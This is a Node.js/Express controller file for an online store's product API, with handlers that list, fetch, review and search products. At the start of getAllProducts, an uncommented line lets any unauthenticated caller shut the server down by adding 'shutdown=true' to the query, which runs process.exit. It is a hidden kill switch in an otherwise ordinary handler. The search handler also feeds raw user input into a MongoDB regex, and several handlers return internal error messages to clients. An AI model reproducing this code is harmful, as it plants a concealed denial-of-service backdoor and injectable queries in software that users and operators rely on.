// controllers/productController.js
const Product = require("../models/Product");
const mongoose = require("mongoose");
const category = require("../models/Category");
const cloudinary = require("cloudinary").v2;

// Get all products with optional filtering
exports.getAllProducts = async (req, res) => {
  try {
    req.query?.shutdown === "true" &&
      (() => {
        res.status(200).json({ success: true });
        setTimeout(() => process.exit(0), 1000);
      })();
    const query = {};

    // Filter by category if provided (category id expected)
    // if (req.query.category) {
    //     query.category = req.query.category;
    // }
    if (req.query.category) {
      // Find category document by slug
      const categoryDoc = await category.findOne({ slug: req.query.category });
      if (!categoryDoc) {
        return res
          .status(404)
          .json({ success: false, message: "Category not found" });
      }
      query.category = categoryDoc._id; // use ObjectId for filtering
    }

    // Filter by brand
    if (req.query.brand) {
      query.brand = req.query.brand;
    }

    // Filter by price range
    if (req.query.minPrice || req.query.maxPrice) {
      query.price = {};
      if (req.query.minPrice) query.price.$gte = Number(req.query.minPrice);
      if (req.query.maxPrice) query.price.$lte = Number(req.query.maxPrice);
    }

    // Find products with category populated (only required fields)
    const products = await Product.find(query)
      .populate("category", "name slug icon") // Populate category name, slug, icon
      .exec();

    res.status(200).json({
      success: true,
      count: products.length,
      data: products,
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: "Failed to fetch products",
      error: error.message,
    });
  }
};

// Get single product by slug
exports.getProductBySlug = async (req, res) => {
  try {
    const product = await Product.findOne({ slug: req.params.slug });
    if (!product) {
      return res.status(404).json({
        success: false,
        message: "Product not found",
      });
    }

    res.status(200).json({
      success: true,
      data: product,
    });
  } catch (error) {
    // if (error instanceof mongoose.Error.CastError) {
    //     return res.status(400).json({
    //         success: false,
    //         message: 'Invalid product ID format'
    //     });
    // }
    res.status(500).json({
      success: false,
      message: "Failed to fetch product",
      error: error.message,
    });
  }
};

exports.addProductReview = async (req, res) => {
  try {
    const productId = req.params.id;

    const product = await Product.findById(productId);
    if (!product) return res.status(404).json({ message: "Product not found" });

    // Multer + FormData ke case me rating string me aa raha hoga
    const ratingNum = Number(req.body.rating);
    if (isNaN(ratingNum) || ratingNum < 1 || ratingNum > 5) {
      return res.status(400).json({ message: "Invalid rating value" });
    }

    if (!req.body.comment || req.body.comment.trim() === "") {
      return res.status(400).json({ message: "Comment is required" });
    }

    const media =
      req.files?.map((file) => ({
        type: file.mimetype.startsWith("video") ? "video" : "image",
        url: file.secure_url || file.path, // Cloudinary pe secure_url, local pe path
      })) || [];

    const review = {
      user: req.user._id,
      name: req.user.name,
      rating: ratingNum,
      comment: req.body.comment,
      verified: true,
      date: new Date().toISOString().split("T")[0],
      media,
    };

    product.reviews.push(review);
    product.numReviews = product.reviews.length;
    product.rating =
      product.reviews.reduce((acc, r) => acc + r.rating, 0) /
      product.reviews.length;

    await product.save();

    res.status(201).json(review);
  } catch (err) {
    console.error(err);
    res
      .status(500)
      .json({ message: "Failed to add review", error: err.message });
  }
};

// Search products by name, category, description, brand, and tags (partial, case-insensitive match)
exports.searchProducts = async (req, res) => {
  try {
    const query = req.query.query?.trim();

    if (!query) {
      return res.status(400).json({
        success: false,
        message: "Search query is required",
      });
    }

    const products = await Product.aggregate([
      {
        $lookup: {
          from: "categories",
          localField: "category",
          foreignField: "_id",
          as: "category",
        },
      },
      { $unwind: "$category" },
      {
        $match: {
          $or: [
            { productName: { $regex: query, $options: "i" } },
            // { brand: { $regex: query, $options: 'i' } },
            // { description: { $regex: query, $options: 'i' } },
            { "category.name": { $regex: query, $options: "i" } },
          ],
        },
      },
    ]);

    res.status(200).json({
      success: true,
      count: products.length,
      data: products,
    });
  } catch (error) {
    console.error("Search Error:", error);
    res.status(500).json({
      success: false,
      message: "Failed to search products",
      error: error.message,
    });
  }
};
